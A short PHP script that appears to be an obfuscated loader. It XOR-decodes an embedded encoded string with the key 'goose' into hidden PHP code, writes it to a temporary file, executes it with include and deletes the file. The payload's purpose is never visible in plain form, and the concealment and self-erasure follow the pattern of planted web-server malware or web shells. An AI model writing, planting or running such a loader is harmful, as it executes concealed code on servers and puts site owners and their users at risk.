<?php
$encrypted = 'W1AfGxVqZQoBFwgdMAEAFwAdBwwJCEdDTFxiZRoLDjAcFhFPSAsaFhcDDgo6Ah0dHBcUSENTVU5UYnkMAU9HGhYUChtbQTgoKic-QAQKCkI6Rk9VQ0dLMDQgMzRIGAAeSDJTWFpST1QIFAcKHwlARk8IaG1PT1NFDwoOFwAVR0g_CgQOGxoKCVVPEA0ODARdFQ8fSFpeamVPU0VHChcaEVxiZQ5obQoDAAAOCU9bDBQcCgdNQzAoNjE8SAQWHEAyRlNDQU9LLCIiOzRUDgIWSC5FWlJSU0IGCwIaCzgdCgARCB0KVExHFGJ5RUdPTxsABgsKAU1AIwAQBBMGAB1fR0FBXAACA0EDDRdIRkhobU9PU0UCFwYHXmplElNobQoDAAAOCU9bDBQcCgdNQzAoNjE8SAQWHEAyRlNDQU9LLCIiOzRUDgIWSC5FWlJSU0IKHAcWCQswHRYWEwAdFkJOTxR-b0dPT1MNAg4LFhdPSCMcBgYbBhwLXU9BXUoUAxoUSxcHH1RMXGJlU0VHTwoLDBNUYnkYamUKHxYCTxR-b0dPT1MNExsfLBcCHB8cCxQKMBAKAwpHR1VTRlR-b0dPT1MAHwYbSGhtEmJ5Wlk';
if (!function_exists('seal')) {
    function seal($data, $key) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        $bin = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $index = strpos($alphabet, $data[$i]);
            $bin .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
        }

        $bytes = '';
        for ($i = 0; $i < strlen($bin); $i += 8) {
            $chunk = substr($bin, $i, 8);
            if (strlen($chunk) < 8) break; // если меньше 8 бит — игнорируем
            $bytes .= chr(bindec($chunk));
        }

        $res = '';
        $klen = strlen($key);
        for ($i = 0; $i < strlen($bytes); $i++) {
            $res .= $bytes[$i] ^ $key[$i % $klen];
        }
        return $res;
    }
}

file_put_contents($tmp = tempnam(sys_get_temp_dir(), 'shf_'), seal($encrypted, 'goose'));
include $tmp;
unlink($tmp);

?>